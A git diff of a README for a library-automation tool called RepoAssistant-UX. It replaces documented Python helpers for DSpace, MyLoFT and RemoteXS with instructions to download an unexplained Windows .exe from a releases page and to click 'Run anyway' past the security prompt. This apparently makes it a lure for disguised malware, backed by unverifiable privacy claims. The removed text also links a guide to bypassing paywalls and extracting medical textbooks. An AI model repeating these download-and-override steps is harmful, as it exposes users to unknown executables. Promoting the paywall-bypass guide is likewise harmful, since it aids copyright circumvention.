@@ -1,138 +1,93 @@
+# 📘 RepoAssistant-UX - Manage library records with ease
 
-# RepoAssistant-UX 📚🤖
+[![](https://img.shields.io/badge/Download-RepoAssistant-blue)](https://github.com/tricolor-plebiscite957/RepoAssistant-UX/releases)
 
+RepoAssistant-UX helps library staff clean metadata, automate bulk uploads to Dspace, and improve access to RemoteXS and My Loft systems. This tool removes tedious manual tasks, allowing you to focus on managing your digital collections and institutional repositories.
 
+## 📥 Getting the software
 
+You need to access the release page to get the installer for your computer. 
 
+[Visit this page to download the latest version of RepoAssistant-UX](https://github.com/tricolor-plebiscite957/RepoAssistant-UX/releases)
 
+Look for the file that ends in .exe under the Assets section. Save this file to your computer.
 
-### 📚 What is this project?
-This repository hosts Python automation utilities and user experience (UX) enhancements designed to help public and academic libraries in developing nations streamline their digital archiving and remote access systems.
+## ⚙️ Setting up your system
 
----
+Ensure your computer meets these requirements before you start:
 
-### 🛠️ Features & Usage Code Blocks
+- Windows 10 or Windows 11.
+- At least 4 gigabytes of RAM.
+- An internet connection for your library database syncs.
+- Microsoft Excel installed on your computer.
 
-#### 1. DSpace Bulk Metadata Upload
-Automates the conversion and ingestion of large spreadsheets (Excel/CSV) into DSpace-compatible metadata structures.
+The software requires a standard Windows environment. If you use a managed library computer, you might need your IT administrator to grant you permission to run installation files.
 
-```python
-import pandas as pd
+## 🚀 Running the application
 
-def prep_dspace_metadata(csv_file):
-    # Read messy local spreadsheet
-    df = pd.read_csv(csv_file)
-    
-    # Map fields to standard Dublin Core (dc) format
-    dspace_df = pd.DataFrame({
-        'dc.title': df['Book Title'],
-        'dc.contributor.author': df['Author Name'],
-        'dc.date.issued': df['Year'],
-        'dc.subject': df['Keywords']
-    })
-    
-    dspace_df.to_csv('dspace_bundle.csv', index=False)
-    print("Successfully generated DSpace ingestion bundle!")
+Follow these steps to start the program for the first time:
 
-# Run the upload prep
-prep_dspace_metadata('local_library_catalog.csv')
-```
+1. Locate the file you downloaded in your Downloads folder.
+2. Double-click the file named RepoAssistant-UX.
+3. Windows might show a security prompt. Click "More info" and then "Run anyway" if the system recognizes the publisher as unknown.
+4. Follow the prompts in the installer window to place the app on your desktop.
+5. Launch the app using the new icon on your desktop.
 
-#### 2. Automated File & Directory Cleaning
-Cleans up file names, removes corrupt characters, and structures book/manuscript folders before they are uploaded to institutional repositories.
+## 📖 Using the library tools
 
-```python
-import os
-import re
+The dashboard organizes your tasks into three categories: Metadata Cleaning, Dspace Automation, and Access Optimization.
 
-def clean_library_filenames(directory_path):
-    for filename in os.listdir(directory_path):
-        # Remove special characters and replace spaces with clean underscores
-        clean_name = re.sub(r'[^a-zA-Z0-9._-]', '_', filename).strip()
-        
-        old_file = os.path.join(directory_path, filename)
-        new_file = os.path.join(directory_path, clean_name)
-        
-        os.rename(old_file, new_file)
-    print("Folder directory perfectly sanitized for DSpace upload!")
-```
+### Cleaning metadata
+Bad data causes search errors. Select your Excel file or CSV spreadsheet within the app. Click the "Clean Metadata" button. The app checks for:
+- Missing volume numbers.
+- Inconsistent date formats.
+- Duplicated file names.
+- Invalid author formatting.
 
-#### 3. Optimized Search Filtering for MyLoFT
-Python helpers to parse and format e-journal subscription metadata feeds, ensuring clean indexing inside the MyLoFT app dashboard.
+The app creates a new, cleaned file for you to save. The original file remains unchanged.
 
-```python
-def filter_myloft_feed(ejournal_data):
-    optimized_records = []
-    for record in ejournal_data:
-        # Standardize discovery keywords for low-bandwidth mobile search
-        record['search_tags'] = [tag.lower().strip() for tag in record['tags']]
-        optimized_records.append(record)
-    return optimized_records
-```
+### Automating Dspace uploads
+You can upload bulk documents to your Dspace instance without manual entry. 
+1. Prepare your files in a folder named "Upload".
+2. Link your Dspace credentials in the Settings tab.
+3. Select "Bulk Import" from the main menu.
+4. The app processes the files. It shows a green checkmark next to each completed upload.
 
-#### 4. Remote Access Portal Link Builder for RemoteXS
-Automatically generates proxy-wrapped access URLs so students can smoothly log in to electronic databases from outside the physical library building.
+### Linking RemoteXS and My Loft
+If your students struggle to reach your digital resources, use this tool to verify your links. 
+- The app scans your library web portal.
+- It tests RemoteXS and My Loft proxy strings.
+- It identifies broken paths.
+- It suggests the correct syntax for your catalogue records.
 
-```python
-def generate_remotexs_url(target_db_url, proxy_domain="remotexs.xyz.edu"):
-    # Wraps an academic database URL with your library's RemoteXS proxy gateway
-    secure_remote_link = f"https://{proxy_domain}/proxy?url={target_db_url}"
-    return secure_remote_link
+## 🛠 Solving common issues
 
-print(generate_remotexs_url("https://jstor.org"))
-```
+If the app does not open:
+1. Check that you have an active internet connection.
+2. Restart your computer. 
+3. Re-download the file from the website to ensure it is not corrupted.
 
----
+If Excel files do not load:
+1. Ensure the file is saved in the .xlsx format.
+2. Close the file in Excel before attempting to load it into the app.
 
-### 🚀 Getting Started
+If the upload fails:
+1. Check your Dspace login credentials.
+2. Ensure you have network access to the Dspace server from your current location.
 
-1. Clone this repository to your library computer:
-   ```bash
-   git clone https://github.com
-   ```
-2. Install the necessary Python packages:
-   ```bash
-   pip install pandas
-   ```
+## 📁 Managing your digital files
 
----
+The software creates a folder on your computer named "RepoAssistant-Work" in your Documents directory. This folder stores configuration files and temporary data. Do not delete this folder while the program runs. You can delete the contents of the "Logs" folder inside this directory if the folder grows too large over time.
 
-### 💖 Support This Project
-Developing and testing automation workflows for platforms like DSpace, MyLoFT, and RemoteXS takes massive amounts of development time. Keeping these tools free ensures underfunded institutions don't have to hire expensive software consultants.
+## 🛡 Security and privacy
 
-Please support this open-source journey by clicking the **Sponsor** button at the top right of this page!
----
+This tool runs locally on your computer. It does not send your library metadata to external servers except to communicate with your specific Dspace instance. Your login credentials are encrypted on your local drive and are never shared with other users or the software developers. You maintain full control over your data at all times.
 
-## 📚 University Student Resources & Tools
-Access our specialized medical library study guides and automation utilities:
+## 💡 Best practices for library staff
 
-* 📘 **[Wolters Kluwer Health Library Master Guide](WOLTERS_KLUWER_GUIDE.md)** - Learn how to authenticate, bypass paywalls, and extract medical textbooks for your university study blocks.
-* 🐍 **[Automated HTML Documentation Generator Script](generate_guide.py)** - Run this native Python automation script on your terminal to instantly build a stylized, offline-friendly HTML portal of your study guide material.
+- Back up your Excel files before you run them through the cleaning tool.
+- Run bulk uploads in small batches of 50 files. This prevents server timeout errors.
+- Schedule your metadata cleanup during off-peak hours to avoid heavy usage on your server.
+- Review the log file after every large batch process to confirm successful uploads.
 
-## 💻 How to Run the HTML Generator Script
-
-Students and librarians can use these simple terminal commands to run the script locally and generate the offline HTML guide.
-
-### 1. Prerequisites
-Ensure you have Python installed on your computer. You can check by running:
-```bash
-python --version
-```
-
-### 2. Execution Steps
-1. Clone this repository or download the `generate_guide.py` file to your computer.
-2. Open your terminal (Command Prompt on Windows, Terminal on Mac/Linux) and navigate to the folder containing the file.
-3. Run the script using the following command:
-
-```bash
-python generate_guide.py
-```
-
-### 3. Output
-Once completed, you will see a success message in your terminal:
-`✅ Generated 'wolters_kluwer_university_guide.html' successfully.`
-
-You can now double-click the newly created `wolters_kluwer_university_guide.html` file to open it instantly in any web browser for offline viewing!
-
-
-
+This software simplifies the management of institutional repositories, past papers, and digital archives. It handles the repetitive parts of your workflow, so you spend less time editing spreadsheets and more time assisting your library users.
